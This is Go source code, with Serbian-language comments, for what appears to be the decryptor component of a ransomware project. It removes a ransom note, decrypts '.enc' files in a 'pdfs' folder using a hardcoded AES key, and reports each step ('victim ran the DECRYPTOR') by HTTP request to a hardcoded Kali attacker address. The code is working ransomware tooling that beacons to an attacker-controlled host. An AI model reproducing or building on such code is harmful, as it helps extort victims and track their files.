package main

import (
    "crypto/aes"
    "crypto/cipher"
    "fmt"
    "net/http"
    "net/url"
    "os"
    "path/filepath"
    "strings"
    "time"
)

const aes_key = "12345678123456781234567812345678"
const kali_ip = "192.168.72.128" 

// Ista funkcija za logovanje
func sendLog(message string) {
    encodedMsg := url.QueryEscape(message)
    url := fmt.Sprintf("http://%s:8080/log?msg=%s", kali_ip, encodedMsg)
    go http.Get(url)
}

func main() {
    path := "pdfs"
    
    sendLog("Žrtva pokrenula DEKRIPTOR! Fajlovi se vraćaju...")

    err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }
        
        if !info.IsDir() && info.Name() == "RANSOM_NOTE.txt" {
            os.Remove(path)
            sendLog("Ransom poruka obrisana.")
            return nil
        }

        if !info.IsDir() && strings.HasSuffix(info.Name(), ".enc") {
            data, err := os.ReadFile(path)
            if err != nil {
                return err
            }
            newFileName := strings.TrimSuffix(path, ".enc")
            file, err := os.Create(newFileName)
            if err != nil {
                return err
            }
            defer file.Close()

            aes_key_byted := []byte(aes_key)
            aes_key_cipher, _ := aes.NewCipher(aes_key_byted)
            gcm, err := cipher.NewGCM(aes_key_cipher)
            if err != nil {
                return err
            }
            nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
            plainText, err := gcm.Open(nil, nonce, ciphertext, nil)
            if err != nil {
                sendLog(fmt.Sprintf("Greska pri dekripciji fajla: %s", path))
                return err
            }

            _, err = file.Write(plainText)
            if err != nil {
                return err
            }
            err = os.Remove(path)
            if err != nil {
                return err
            }
            
            // ŠALJEMO KA KALIJU:
            sendLog(fmt.Sprintf("Dekriptiran: %s", newFileName))
        }
        return err
    })

    if err != nil {
        sendLog("Greška prilikom dekripcije.")
        return
    }
    sendLog("Dekripcija zavrsena. Fajlovi vraceni.")
    time.Sleep(1*time.Second)
}